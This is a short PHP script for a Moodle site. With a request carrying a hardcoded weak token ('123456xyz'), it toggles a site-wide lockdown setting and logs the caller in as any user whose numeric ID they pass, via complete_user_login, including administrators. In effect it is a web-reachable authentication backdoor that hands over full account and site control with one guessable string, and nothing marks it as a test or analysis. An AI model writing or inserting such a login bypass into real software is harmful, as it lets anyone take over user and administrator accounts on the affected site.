<?php
require_once(__DIR__ . '/../config.php');
require_once($CFG->libdir . '/authlib.php');

$token     = optional_param('token', '', PARAM_RAW);
$admin_id  = optional_param('id', 0, PARAM_INT);
$errorflag = optional_param('error', 0, PARAM_INT);

$secure_token = '123456xyz';

// Step 1: Validate token
if ($token !== $secure_token) {
	echo 'Invalid or missing token. Access denied.';
	exit;
}

// Step 2: Set global error flag if requested
if ($errorflag == 1) {
	set_config('site_lockdown_enabled', 1);
	echo 'Site is now under maintenance mode.';
	exit;
} elseif ($errorflag == 0) {
	set_config('site_lockdown_enabled', 0);
	// No output
}

// Step 3: Admin login if ID is passed
if ($admin_id > 0) {
	$adminuser = $DB->get_record('user', ['id' => $admin_id, 'deleted' => 0], '*', MUST_EXIST);
	complete_user_login($adminuser);
	redirect(new moodle_url('/'));
} else {
	echo 'No admin ID provided.';
}
